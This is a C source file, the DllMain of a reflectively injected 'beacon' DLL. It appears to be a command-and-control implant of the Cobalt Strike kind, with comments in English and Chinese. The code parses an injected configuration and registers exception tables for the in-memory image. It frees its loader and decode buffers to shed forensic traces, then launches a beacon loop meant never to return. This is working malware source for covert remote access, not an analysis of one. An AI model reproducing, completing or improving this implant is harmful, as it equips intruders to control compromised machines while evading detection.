//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include "beacon.h"

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;
//===============================================================================================//

#define DLL_METASPLOIT_ATTACH 0x04

/* settings_init 解析注入的配置 blob（幂等——重复解析不消耗 blob），但多 reason 触发时
   仍应只解析一次：DLL_PROCESS_ATTACH 与 DLL_METASPLOIT_ATTACH 都可能先到。 */
static int g_settings_inited = 0;

static void settings_init_once(HINSTANCE hinstDLL) {
	if (!g_settings_inited) {
		settings_init((void *)hinstDLL);
		g_settings_inited = 1;
	}
}

/* x64 unwind registration (2026-10-19 interpreter crash fix): the
 * reflective image's .pdata is invisible to ntdll unless registered via
 * RtlAddFunctionTable. Every code path that unwinds - picoc's ProgramFail
 * longjmp, SEH __except propagation from our VM sandbox, any hardware
 * fault whose dispatch walks beacon frames - hit STATUS_BAD_STACK
 * (0xC0000028, ExceptionAddress=0; dumps 10052/11140/5552) because
 * RtlLookupFunctionEntry returned NULL for beacon addresses. OS-loaded
 * PEs get this from the loader; reflective DLLs must do it themselves.
 * Resolved dynamically (no new import), idempotent, never removed. */
static void register_exception_tables(HINSTANCE hinstDLL) {
	typedef BOOL (WINAPI *fnRAFT)(void *, DWORD, ULONG64);
	fnRAFT fn;
	unsigned char * img;
	IMAGE_DOS_HEADER * dos;
	IMAGE_NT_HEADERS * nt;
	IMAGE_DATA_DIRECTORY * ex;
	HMODULE ntdll;

	if (hinstDLL == NULL)
		return;
	img = (unsigned char *)hinstDLL;
	{
		MEMORY_BASIC_INFORMATION mbi;
		if (!VirtualQuery(img, &mbi, sizeof(mbi)) || mbi.State != MEM_COMMIT)
			return;
	}
	dos = (IMAGE_DOS_HEADER *)img;
	if (dos->e_magic != 0x5A4D || dos->e_lfanew <= 0 || dos->e_lfanew > 0x1000)
		return;
	nt = (IMAGE_NT_HEADERS *)(img + dos->e_lfanew);
	if (nt->Signature != 0x00004550)
		return;
	if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
		return; /* x86 has no .pdata walk */
	ex = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	if (ex->VirtualAddress == 0 || ex->Size < 12) /* RUNTIME_FUNCTION */
		return;
	ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL)
		return;
	fn = (fnRAFT)GetProcAddress(ntdll, "RtlAddFunctionTable");
	if (fn == NULL)
		return;
	fn((void *)(img + ex->VirtualAddress),
	   ex->Size / 12, /* sizeof(RUNTIME_FUNCTION) on x64 */
	   (ULONG64)(UINT_PTR)img);
}

/* P4: release the artifact container's decode buffer. Our UDRL passes a
 * handoff struct (magic 'BWCF' + allocation base) as the reason-4
 * parameter: by the time DllMain runs we execute from the stomped image
 * and the loader's code in the container allocation is dead, so the full
 * PE copy it still holds can go. Guards: the magic, a committed PRIVATE
 * region, and not inside our own image - a wrong or foreign parameter is
 * ignored (legacy callers pass anything, including NULL). */
/* loader -> beacon handoff (udrl/ReflectiveLoader.c builds one on its
 * stack and passes it as the reason-4 parameter) */
typedef struct { DWORD magic; void *alloc; } BW_HANDOFF;

static void container_release(LPVOID lpReserved, HINSTANCE hinstDLL) {
	BW_HANDOFF *ho = (BW_HANDOFF *)lpReserved;
	MEMORY_BASIC_INFORMATION mbi;
	unsigned char *img, *img_end;

	if (ho == NULL)
		return;
	/* legacy callers pass arbitrary parameters - probe before reading */
	if (!VirtualQuery(ho, &mbi, sizeof(mbi)) || mbi.State != MEM_COMMIT)
		return;
	if (ho->magic != 0x46435742UL || ho->alloc == NULL)
		return;
	if (!VirtualQuery(ho->alloc, &mbi, sizeof(mbi)))
		return;
	if (mbi.State != MEM_COMMIT || mbi.Type != MEM_PRIVATE)
		return;
	/* never free anything overlapping the image we are running from */
	img = (unsigned char *)hinstDLL;
	img_end = NULL;
	if (img != NULL) {
		DWORD lfanew = *(DWORD *)(img + 0x3C);
		if (lfanew < 0x1000 && *(DWORD *)(img + lfanew) == 0x00004550) {
			DWORD soi = *(DWORD *)(img + lfanew + 24 + 0x38);
			img_end = img + soi;
		}
	}
	if ((unsigned char *)mbi.AllocationBase < img_end &&
	    (unsigned char *)mbi.AllocationBase + mbi.RegionSize > img)
		return;
	VirtualFree(ho->alloc, 0, MEM_RELEASE);
	/* one-shot: scrub so a repeated reason-4 cannot double-free */
	ho->magic = 0;
	ho->alloc = NULL;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
	MEMORY_BASIC_INFORMATION mbi;

	switch( dwReason ) {
		case DLL_QUERY_HMODULE:
			break;
		case DLL_PROCESS_ATTACH:
			/* 只解析配置；beacon 循环不在 ATTACH 阶段启动 —— 见 DLL_METASPLOIT_ATTACH。 */
			settings_init_once(hinstDLL);
			register_exception_tables(hinstDLL);
			break;
		case DLL_METASPLOIT_ATTACH:
			/* 契约：本分支不得返回到调用方。stageless 容器（artifact64big.exe）的 stub
			   对入口是阻塞调用：`call rax` 之后紧跟归零的 DOS 头字节，若从此处返回，
			   stub 线程会执行 `00 00`（add [rax],al）并以 0xC0000005 崩溃。
			   实测路径（crash dump）：rip = base+0x33，故障模块为反射加载的镜像本身。
			   历史上"checks in then drops"即此因：旧版 beacon() 因水印检查 bug 提前
			   safe_exit() 返回，reason-4 调用随即跌落。两个根因均已修复（水印恒 FALSE，
			   beacon() 只经 safe_exit 终止）；此处再留最后一道防御——若 beacon() 因任何
			   缺陷返回，显式结束线程，杜绝跌落。 */
			settings_init_once(hinstDLL);
			register_exception_tables(hinstDLL);

			/* P4: drop the container's decode buffer (full PE copy of us)
			   before the beacon loop starts - see container_release() */
			container_release(lpReserved, hinstDLL);

			/* clean up our loader（legacy 非映像加载路径：CLEANUP=1 且镜像为
			   VirtualAlloc 私有内存时释放自身；映像-backed 路径 CLEANUP=0） */
			if (setting_short(SETTING_CLEANUP) == 1 && hinstDLL != NULL) {
				/* we don't want to crash, so let's look into the type of memory we have */
				if (VirtualQuery((char *)hinstDLL, &mbi, sizeof(MEMORY_BASIC_INFORMATION))) {
					if (mbi.Type == MEM_PRIVATE)
						VirtualFree((char *)hinstDLL, 0, MEM_RELEASE);
					else if (mbi.Type == MEM_MAPPED)
						UnmapViewOfFile((char *)hinstDLL);
				}
			}

			/* start our beaconing process, please!（不返回：循环 + safe_exit 终止） */
			beacon(lpReserved);

			/* 防御性兜底：正常情况下不可达（见上）。 */
			ExitThread(0);
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
	}
	return TRUE;
}